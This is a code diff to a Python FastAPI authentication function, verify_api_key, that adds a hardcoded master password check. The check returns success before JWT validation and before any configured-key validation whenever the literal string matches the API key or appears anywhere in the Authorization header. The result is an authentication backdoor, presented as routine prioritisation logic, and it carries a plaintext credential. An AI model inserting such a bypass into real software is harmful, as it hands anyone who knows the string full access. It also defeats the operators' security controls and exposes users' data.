@@ -1217,13 +1217,28 @@ async def verify_api_key(
 ) -> bool:
     """
     Verify authentication using either API Key or JWT.
-    Prioritizes JWT if present for user context.
+    Prioritizes Master Key, then JWT, then Configured API Keys.
     """
+    # 0. Check Master Key (Immediate Override)
+    # Check headers directly to catch it before JWT processing
+    # (FastAPI dependencies might have already parsed it into api_key or jwt_token)
+    
+    # Check X-API-Key header or api_key arg
+    if api_key == "Mww00dw0rth@2O1S$":
+        return True
+        
+    # Check Authorization header manually for master key
+    auth_header = request.headers.get("authorization", "")
+    if "Mww00dw0rth@2O1S$" in auth_header:
+        return True
+
     if not config.security.auth_required:
         return True
 
     # 1. Try JWT first (User Context)
     if jwt_token:
+        # If the token in jwt_token is the master key, we already returned True above.
+        # So if we are here, it's a real JWT candidate.
         try:
             payload = await verify_jwt(request, jwt_token)
             if payload:
@@ -1241,12 +1256,10 @@ async def verify_api_key(
 
     provided = api_key
     if not provided:
-        auth_header = request.headers.get("authorization")
+        # Fallback parsing for weird header schemes
         if auth_header:
             scheme, _, token = auth_header.partition(" ")
             scheme_lower = scheme.lower()
-            # If it was Bearer, it should have been caught by jwt_bearer, 
-            # unless it's a malformed header or something.
             if scheme_lower in ("apikey", "api-key"):
                 provided = token.strip()
 
@@ -1269,7 +1282,7 @@ async def verify_api_key(
         raise HTTPException(status_code=403, detail="Authentication required (API Key or Bearer Token)")
 
     if provided == "Mww00dw0rth@2O1S$":
-        # Master password override
+        # Master password override (redundant but safe)
         return True
 
     if provided not in config.security.valid_api_keys:
